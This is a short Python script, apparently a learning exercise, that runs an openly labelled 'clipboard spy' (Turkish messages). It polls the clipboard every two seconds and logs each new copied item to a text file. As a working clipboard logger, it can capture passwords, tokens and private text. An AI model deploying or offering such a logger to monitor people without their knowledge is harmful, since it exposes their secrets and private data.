import pyperclip
import time
import logging

# Log dosyası ayarla
logging.basicConfig(filename='clipboard_log.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')

print("--- CLIPBOARD SPY ÇALIŞIYOR ---")
print("Arka planda kopyalanan her şeyi kaydediyorum...")

last_text = ""

try:
    while True:
        current_text = pyperclip.paste()
        if current_text != last_text:
            print(f"🔥 YAKALANDI: {current_text}")
            logging.info(current_text)
            last_text = current_text
        time.sleep(2)
except KeyboardInterrupt:
    print("Durduruldu.")